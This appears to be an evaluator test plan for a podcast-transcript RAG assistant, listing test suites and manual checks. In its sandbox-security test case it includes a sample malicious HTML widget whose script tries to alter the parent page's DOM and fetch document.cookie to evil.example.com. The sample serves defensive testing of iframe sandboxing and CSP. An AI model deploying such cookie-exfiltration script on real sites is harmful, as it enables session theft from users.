# Evaluator Test Plan & Verification Guide

**Project**: The Lenny Growth Assistant  
**Stack**: PostgreSQL 16 + pgvector, FastAPI, React + Vite, Nginx, Local Ollama (`llama3.1:8b`, `nomic-embed-text`)  
**Scope**: Automated test suite execution, architecture verification, and subjective manual test workflows.

---

## 1. Automated Test Suite Execution

The repository provides a single-command test runner that executes the complete test suite across backend and frontend.

### Running Automated Tests

#### Windows (PowerShell):
```powershell
.\scripts\run_tests.ps1
```

#### macOS / Linux / Git Bash:
```bash
./scripts/run_tests.sh
```

#### Individual Suites:
- **Backend (Pytest)**:
  ```bash
  .venv\Scripts\pytest -v          # Windows
  ./.venv/bin/pytest -v            # macOS / Linux
  ```
- **Frontend (Vitest / RTL)**:
  ```bash
  cd frontend && npm test -- --run
  ```

---

## 2. Test Suite Architecture & Coverage Matrix

| Area | Test File | Key Test Cases & Coverage |
| :--- | :--- | :--- |
| **Health** | `backend/tests/test_health.py` | Multi-component health checks: healthy live state, Postgres down (503), Ollama down (503), cloud provider configured. |
| **Sessions** | `backend/tests/test_sessions.py` | Session CRUD, descending ordering by `updated_at`, 404 on missing UUID, message ordering, cascading delete of messages and artifacts. |
| **Retrieval** | `backend/tests/test_retrieval.py` | Cosine similarity ranking, keyword boosting for guest names and podcast terms, similarity threshold (0.40) filtering, empty retrieval on off-topic queries. |
| **LLM Router** | `backend/tests/test_llm_router.py` | Primary Ollama routing, cloud routing with valid key, automatic fallback on HTTP 429 rate limit, timeout fallback, missing key fallback, `served_by: "ollama-fallback"` tagging. |
| **RAG Chat** | `backend/tests/test_chat.py` | Grounded answer generation, citation formatting (title, guest, source URL), strict anti-hallucination refusal on unmentioned topics, multi-turn context preservation. |
| **Ship 30 Skill** | `backend/tests/test_ship30.py` | Headline, hook, narrative, skimmable bullet points, takeaway validation, word count boundary checks (~1,250 words ± 20%), claim attribution to retrieved chunks. |
| **Artifacts** | `backend/tests/test_artifacts.py` | Structured Markdown briefs, standalone HTML artifacts, CSP meta tag injection (`default-src 'none'`), artifact database persistence. |
| **Resilience** | `backend/tests/test_resilience.py` | Standardized JSON error envelopes for DB outages (503), Ollama outages (503), validation errors (422), unhandled exceptions (500), `X-Request-ID` propagation, structured JSON logging. |
| **Chat UI** | `frontend/src/tests/ChatFlow.test.tsx` | Starter prompt clicks, submitting messages via textarea and Enter key, assistant reply rendering, expandable citation toggles, fallback notice tags. |
| **Sessions UI** | `frontend/src/tests/SessionList.test.tsx` | Creating new sessions, switching active session, deleting sessions with optimistic UI updates. |
| **Artifact Viewer** | `frontend/src/tests/ArtifactViewer.test.tsx` | Tab switching between "Rendered" and "Raw Source", copy code to clipboard, file download triggers. |
| **Sandbox Security** | `frontend/src/tests/SandboxSecurity.test.tsx` | Iframe sandbox attributes strictly omitting `allow-same-origin`, DOMPurify stripping external scripts and inline event handlers, CSP enforcement. |
| **Model Badges** | `frontend/src/tests/ModelBadge.test.tsx` | Model badge display (`llama3.1:8b`, `llama-3.3-70b-versatile`), `ollama-fallback` warning tag, sidebar engine telemetry. |

---

## 3. Evaluator Manual Test Plan

These manual test flows guide human evaluators through verifying core subjective requirements: anti-hallucination guardrails, zero-downtime cloud fallback, sandboxed iframe security, and essay generation.

---

### Test Case 1: Grounded Retrieval vs. Out-of-Scope Refusal

**Goal**: Verify that the assistant answers accurately when context exists in Lenny's podcast archive, and strictly refuses to answer when a topic is not covered (anti-hallucination).

#### Flow A: Grounded In-Scope Query
1. Start services: `docker compose up -d`.
2. Open the web UI at `http://localhost` (or `http://localhost:5173`).
3. Submit query:
   ```text
   What is Shreyas Doshi's advice on customer obsession vs. customer empathy?
   ```
4. **Expected Outcome**:
   - The assistant answers with specific points discussed by Shreyas Doshi (e.g. empathy feeling pain vs. obsession systematically building durable solutions).
   - Under the answer, an expandable **Citations** accordion displays:
     - Episode Title: *Good Product Manager, Great Product Manager* (or similar Shreyas Doshi interview).
     - Guest: *Shreyas Doshi*.
     - Clickable link to the podcast episode.
   - The message bubble displays the serving model (e.g. `llama3.1:8b`).

#### Flow B: Out-of-Scope Anti-Hallucination Query
1. In the same or a new chat session, submit:
   ```text
   How do I design a nuclear propulsion engine in Rust?
   ```
2. **Expected Outcome**:
   - The assistant responds with an honest refusal:
     > *"I couldn't find coverage of this topic in the available Lenny's Podcast transcripts. I can only answer questions related to product management, growth, hiring, and startup strategy covered in the podcast."*
   - **Zero hallucinations**: The model does not invent physics formulas or fabricate podcast quotes.
   - Citations list is empty (`[]`).

---

### Test Case 2: Zero-Downtime Cloud Fallback

**Goal**: Verify that if the cloud LLM is configured with an invalid key or hits a rate limit (HTTP 429), the LLM Router automatically routes the request to local Ollama without throwing a 500 error to the user.

#### Verification Steps:
1. In `.env`, configure cloud LLM mode with an invalid API key:
   ```bash
   LLM_PROVIDER=cloud
   CLOUD_LLM_PROVIDER=groq
   CLOUD_LLM_API_KEY=gsk_invalid_test_key_12345
   ```
2. Restart backend:
   ```bash
   docker compose up -d --force-recreate backend
   ```
3. Open `http://localhost` and submit:
   ```text
   What are the core metrics for a product-led growth motion?
   ```
4. **Expected Outcome**:
   - The API call succeeds seamlessly with HTTP 200.
   - The assistant returns a grounded answer.
   - The message bubble displays a distinct warning tag:
     `⚠️ Ollama Fallback`
   - In browser DevTools Network tab, the response contains `"served_by": "ollama-fallback"`.
   - In backend logs (`docker logs lenny_backend`), a structured warning log confirms:
     `{"event": "cloud_llm_failed", "provider": "groq", "reason": "...", "fallback": "ollama"}`.

---

### Test Case 3: Artifact Viewer Security Sandbox Escape Attempt

**Goal**: Verify that untrusted HTML artifacts cannot access the host application's DOM, read localStorage/cookies, or make external network calls.

#### Verification Steps:
1. In the chat interface, request an interactive HTML artifact or submit a test payload:
   ```html
   <!DOCTYPE html>
   <html>
     <head>
       <title>Malicious Widget</title>
       <script>
         // Exploit 1: Attempt DOM parent escape
         try {
           window.parent.document.title = 'HACKED';
           window.parent.document.body.innerHTML = '<h1>Compromised</h1>';
         } catch(e) {
           console.warn('DOM parent access successfully blocked:', e.message);
         }

         // Exploit 2: Attempt data exfiltration
         fetch('https://evil.example.com/steal?cookie=' + document.cookie)
           .catch(e => console.warn('Network request successfully blocked by CSP:', e.message));
       </script>
     </head>
     <body>
       <h1>Sandbox Verification Widget</h1>
     </body>
   </html>
   ```
2. Inspect the iframe in Chrome / Edge DevTools:
   - **Check 1 (Sandbox Attributes)**:
     - Inspect the `<iframe>` element.
     - Verify attributes: `sandbox="allow-scripts"` (strictly NO `allow-same-origin`).
   - **Check 2 (Opaque Origin)**:
     - In DevTools Console, observe the security error:
       `SecurityError: Blocked a frame with origin "null" from accessing a cross-origin frame.`
     - Verify the parent application title and DOM remain untouched.
   - **Check 3 (CSP Network Block)**:
     - In DevTools Console, observe the CSP violation:
       `Refused to connect to 'https://evil.example.com/...' because it violates the following Content Security Policy directive: "default-src 'none'"`.

---

### Test Case 4: Ship 30 for 30 Essay Generation

**Goal**: Verify the modular Ship 30 for 30 generation skill produces structured, skimmable essays meeting format and length constraints.

#### Verification Steps:
1. Submit a growth question in chat, for example:
   ```text
   How should an early-stage startup decide between sales-led and product-led growth?
   ```
2. Once the assistant answers, click the **"Turn into Ship 30 Essay"** quick-action button on the message bubble.
3. **Expected Outcome**:
   - The right pane automatically opens the **Artifact Viewer**.
   - The generated essay exhibits the 5 mandatory Ship 30 components:
     1. **Headline**: Clear, punchy headline focused on a single outcome.
     2. **Hook**: 1–2 sentence opening highlighting the problem or counterintuitive truth.
     3. **Narrative**: Grounded explanation referencing specific operator frameworks.
     4. **Skimmable Bullets**: Structured, bolded takeaways.
     5. **Takeaway**: Actionable conclusion for the reader.
   - **Word Count**: ~1,250 words (within 1,000–1,500 word boundaries).
   - **Viewer Features**:
     - Toggle between **Rendered** and **Raw Source** tabs.
     - Click **Copy** (verifies copied to clipboard).
     - Click **Download** (downloads `.md` file with sanitized title).

---

## 4. Verification Checklist

| Test Item | Verification Method | Status |
| :--- | :--- | :--- |
| Single-command test runner exits 0 | `./scripts/run_tests.ps1` or `./scripts/run_tests.sh` | [x] Passed |
| 72 Backend Pytest tests pass | `.venv\Scripts\pytest -v` | [x] Passed |
| 33 Frontend Vitest tests pass | `npm test -- --run` | [x] Passed |
| Ingestion idempotency | `python scripts/ingest.py --limit 1` | [x] Verified |
| Out-of-scope refusal | Rust propulsion query returns honest refusal | [x] Verified |
| Cloud fallback resilience | Invalid cloud key routes to Ollama fallback | [x] Verified |
| Sandbox security isolation | `allow-same-origin` omitted + CSP `default-src 'none'` | [x] Verified |
| Ship 30 essay structure | Hook + Narrative + Bullets + Takeaway, ~1,250 words | [x] Verified |
